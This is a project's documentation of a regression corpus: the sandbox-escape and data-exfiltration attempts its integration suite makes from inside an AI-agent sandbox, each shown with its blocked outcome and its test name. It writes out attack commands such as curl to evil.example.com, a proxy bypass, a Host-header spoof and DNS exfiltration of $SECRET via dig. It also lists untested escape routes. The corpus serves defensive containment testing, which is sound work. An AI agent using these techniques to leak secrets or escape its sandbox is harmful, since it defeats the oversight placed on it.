# Sandbox escape regression corpus

A log of the escape and exfiltration techniques the project's own end-to-end
suite tries against a real bottle. It is a regression corpus written by the
project, not the result of outside red-teaming. New techniques go at the
bottom.

Each entry names the test and `subTest` that runs it, in
`tests/integration/test_sandbox_escape.py` (class `TestSandboxEscape`). The
date is when that attack first went into the suite, from git history. The
suite brings up one bottle whose only allowlisted host is the Claude
provider's `api.anthropic.com` route, with planted fake secrets and a git-gate
repo whose upstream is unreachable.

## Where it runs

- **Docker**: every pull request and push to `main`, on Gitea and on GitHub's
  hosted runners. That job must run all integration tests with none skipped
  ([ci.md](../reference/ci.md)).
- **Firecracker and macos-container**: only in the manually dispatched
  pre-release matrix, on self-hosted runners (macOS is advisory). Those jobs
  don't have the no-skip gate, so a skipped test there doesn't fail the job.

So on every change the corpus proves the Docker backend only. Firecracker and
Apple container isolation is exercised before releases, not per change.

---

### Non-allowlisted hostname
**Since**: 2026-05-26  
**Technique**: `curl https://evil.example.com/` from inside the agent.  
**Outcome**: Refused. The test checks only that curl (`--fail`) exits non-zero.  
**Test**: `test_1_hostname_not_in_allowlist`

---

### Direct IP literal
**Since**: 2026-05-26  
**Technique**: `curl https://198.51.100.1/` (RFC 5737 documentation range).  
**Outcome**: Refused. The test checks only that curl exits non-zero.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="direct IP"`

---

### Proxy bypass
**Since**: 2026-10-22  
**Technique**: `curl --noproxy '*' http://1.1.1.1/` to dial a public address without the egress proxy.  
**Outcome**: No connection. The agent's network has no route off the host except through the gateway; any HTTP status at all would count as a leak.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="proxy bypass"`

---

### Allowed hostname resolved to another IP (`--resolve`)
**Since**: 2026-05-26  
**Technique**: `curl --resolve api.anthropic.com:443:198.51.100.1 https://api.anthropic.com/` to send an allowed name to an unrelated address.  
**Outcome**: The address is never used: through a proxy, curl's `--resolve` doesn't apply to the target, and the gateway resolves the name itself. The test checks only that curl (`--fail`) exits non-zero, so an error status from the real host would also pass it.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="host-header spoof"`

---

### CONNECT to an unlisted host with a listed `Host`
**Since**: 2026-10-26  
**Technique**: HTTPS to `example.com` with `Host: api.anthropic.com`, so the request inside the tunnel would be policed (and given credentials) as the allowed host.  
**Outcome**: The `CONNECT` itself gets a 403; no tunnel is opened.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to unlisted host, Host names a listed one"`

---

### Plain HTTP to an unlisted host with a listed `Host`
**Since**: 2026-10-26  
**Technique**: `http://example.com/` with `Host: api.anthropic.com`.  
**Outcome**: 403 from the gateway with an egress marker.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="plain HTTP to unlisted host, Host names a listed one"`

---

### CONNECT to another port
**Since**: 2026-10-26  
**Technique**: `https://example.com:22/`, a tunnel that could carry raw TCP.  
**Outcome**: The `CONNECT` gets a 403.  
**Test**: `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to an unlisted host's other port"`

---

### Secret in path, query, body or header
**Since**: 2026-05-26  
**Technique**: A planted secret in the URL path, the query string, a JSON POST body, and an `X-Custom` header, each to `raw.githubusercontent.com`.  
**Outcome**: 403 with an egress marker, or a refusal at `CONNECT`. The destination is not on the allowlist, so this exercises the allowlist, not DLP on an allowed host. Outbound DLP on allowed hosts is covered by unit tests (`tests/unit/test_dlp_detectors.py`, `tests/unit/test_egress_addon_request_flow.py`), not by this suite.  
**Test**: `test_3_http_exfil_blocked`, subTests `shape="path"`, `"query"`, `"body"`, `"header"`

---

### Secret in a subdomain of an allowed host
**Since**: 2026-05-26  
**Technique**: `https://$SECRET.api.anthropic.com/`, which looks like it's under the allowed name.  
**Outcome**: Refused. The allowlist matches the exact host. The test checks only that curl exits non-zero.  
**Test**: `test_4_dns_exfil_blocked`, subTest `attack="crafted subdomain"`

---

### Direct DNS query to a public resolver
**Since**: 2026-05-26  
**Technique**: `dig @8.8.8.8 "$SECRET.example.com"`.  
**Outcome**: No reply. Any reply, even NXDOMAIN, would mean the query left the host.  
**Test**: `test_4_dns_exfil_blocked`, subTest `attack="direct dig"`

---

### The runtime's own resolver
**Since**: 2026-10-22  
**Technique**: `dig example.com` against the resolver the container or VM is given.  
**Outcome**: The name doesn't resolve, so that resolver isn't a channel off the host.  
**Test**: `test_4_dns_exfil_blocked`, subTest `attack="runtime resolver"`

---

### Token-shaped secret pushed through git-gate
**Since**: 2026-05-26 (the current GitHub, Slack and GitLab shapes since 2026-07-11)  
**Technique**: Commit a README linking to an attacker URL with a `ghp_…`, `xoxb-…` or `glpat-…` token in it, and push through git-gate.  
**Outcome**: Refused by gitleaks in pre-receive, before git-gate tries the upstream (the output must name gitleaks and carry no upstream network error).  
**Test**: `test_5_readme_push_blocked`, subTests `secret="github"`, `"slack"`, `"gitlab"`

---

### The bottle's own shapeless secret pushed
**Since**: 2026-10-23  
**Technique**: Commit a bottle env secret (a `?` value) that has no token shape gitleaks knows, and push.  
**Outcome**: Refused by git-gate's held-secret scan (`gateway/git_gate/held_secret_scan.py`), which matches the bottle's registered secret values.  
**Test**: `test_6_held_secrets_never_leave`, subTest `attack="push secret env value"`

---

### The canary pushed
**Since**: 2026-10-23  
**Technique**: Commit the bottle's per-session canary value and push.  
**Outcome**: Refused by the held-secret scan.  
**Test**: `test_6_held_secrets_never_leave`, subTest `attack="push canary"`

---

### The canary sent to an allowlisted host
**Since**: 2026-10-23  
**Technique**: POST the canary in a JSON body to `api.anthropic.com`, which is allowed.  
**Outcome**: 403 from egress DLP naming `HELD_CANARY`. The canary check runs on every inspected route, whatever the route's DLP settings. On an `inspect: false` route it isn't seen ([gateway.md](../reference/gateway.md#outbound-dlp)).  
**Test**: `test_6_held_secrets_never_leave`, subTest `attack="canary to an allowlisted host"`

---

## Not covered yet

The suite doesn't attempt:

- **Escaping the VM or container**: kernel or hypervisor exploits, container
  runtime escapes, or a root-capable agent removing its in-guest firewall on
  macos-container ([backends.md](../reference/backends.md#agents-cant-reach-each-other)).
- **The control plane from inside a bottle**: reaching or abusing the
  orchestrator or the host controller. Control-plane authentication and
  per-bottle token and allowlist isolation have their own Docker integration
  tests (`test_orchestrator_docker_auth.py`, `test_multitenant_isolation.py`),
  which don't attack from inside an agent.
- **Getting past the trust prompt**: a repository's bottle or agent gaining
  grants without this host trusting it.
- **`inspect: false` routes**: the suite's bottle has none, so nothing tests
  what an unscanned tunnel can carry.
- **Outbound DLP on an allowed host** for planted secrets, beyond the canary:
  see the path, query, body and header entry above.
- **The console link**: what a paired console can do to the host
  ([host-controller.md](../reference/host-controller.md#what-pairing-lets-the-console-do)).
